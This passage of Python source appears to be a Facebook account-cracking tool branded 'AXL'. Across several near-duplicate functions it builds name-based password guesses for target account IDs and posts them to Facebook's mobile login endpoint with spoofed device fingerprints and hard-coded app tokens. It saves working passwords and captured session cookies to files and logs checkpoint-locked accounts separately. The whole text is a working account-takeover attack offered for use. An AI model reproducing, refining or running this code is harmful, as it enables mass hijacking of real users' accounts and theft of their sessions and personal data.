                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':'45204',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':'45201',
                                        'x-fb-device-group': '5120',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-friendly-name':'authenticate',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [AXL-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                        open('/sdcard/AXL_FILE_M2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AXL_FILE_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
                                                                                  
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [PATAY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AXL-FILE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)                                                 
                                                break
                                        else:
                                                open('/sdcard/AXLbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AXL-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Infinix;FBBD/Infinix;FBPN/{fbpn};FBDV/Infinix X6821;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "account_recovery",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'sim_serials': "['80973453345210784798']",
                                        'openid_flow': 'android_login',
                                        'openid_provider': 'google',
                                        'openid_emails': "['01710940017']",
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"en_US","client_country_code":"US",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':'45204',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':'45201',
                                        'x-fb-device-group': '5120',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-friendly-name':'authenticate',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [AXL-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/AXL_M3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AXL_FILE_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
                                                                                  
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [PATAY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AXL-FILE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)                                                 
                                                break
                                        else:
                                                open('/sdcard/AXLbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AXL-M4] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBPN/{fbpn};FBDV/RMX3706;FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid' : str(uuid.uuid4()),
'format' : 'json',
'device_id' : str(uuid.uuid4()),
'email' : uid,
'password' : pw,
'generate_analytics_claim' : '1',
'community_id' : '',
'linked_guest_account_userid' :'',
'cpl' : 'true',
'try_num' : '1',
'family_device_id' : str(uuid.uuid4()),
'secure_family_device_id' : str(uuid.uuid4()),
'sim_serials' : ["00920088911210748054"],
'credentials_type' : 'password',
'fb4a_shared_phone_cpl_experiment' : 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group' : 'enable_v3_at_risk',
'enroll_misauth' : 'false',
'generate_session_cookies' : '1',
'error_detail_type' : 'button_with_disabled',
'source' : 'login',
'generate_machine_id' : '1',
'jazoest' : '22377',
'meta_inf_fbmeta' : 'V2_UNTAGGED',
'advertiser_id' : str(uuid.uuid4()),
'encrypted_msisdn': '',
'currently_logged_in_userid' : '0',
'locale' : 'en_US',
'client_country_code' : 'US',
'fb_api_req_friendly_name' : 'authenticate',
'fb_api_caller_class' : 'Fb4aAuthHandler',
'api_key' : '882a8490361da98702bf97a021ddc14d',
'sig' : 'e5abae6d6564813bfadc6dcd42256834',
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
                                head = {
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [AXL-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/AXL_M4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ISHMUM_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                       
                                        oks.append(ids)              
                                        break                                                                         
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [PATAY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AXL-FILE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/AXLbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass                        
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [AXL-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
                        fbbv = str(random.randint(111111111,999999999))
                        androidon = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                        fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        fblc = random.choice(["ja_JP","en_AF","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBCR/Etisalat;FBMF/Samsung;FBBD/Samsung;FBDV/SM-G991V;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'device_based_login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [AXL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}" 
                                        open('/sdcard/AXL_R_COOKiE_M1.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/AXL-R-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;208m [PATAY-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AXL-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass                          
def rndm(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;37m [AXL-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        
                        facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
                        fbbv = str(random.randint(111111111,999999999))
                        androidon = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                        fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        fblc = random.choice(["ja_JP","en_AF","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBCR/Etisalat;FBMF/Oppo;FBBD/Oppo;FBDV/CPH2519;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={'Host': 'b-graph.facebook.com',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Quality': 'EXCELLENT',
'X-Fb-Sim-Hni': '41001',
'X-Fb-Net-Hni': '41001',
'User-Agent':ua,
'X-Fb-Connection-Bandwidth': '24714729',
'Content-Type': 'application/x-www-form-urlencoded',
'X-Fb-Connection-Type': 'WIFI',
'X-Fb-Device-Group': '4503',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'Priority': 'u=3, i',
'Accept-Encoding': 'gzip, deflate',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
}

                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [AXL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        open('/sdcard/AXL_R_COOKiE_M2.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/AXL-R-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;208m [PATAY-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AXL-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass                   
                        
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()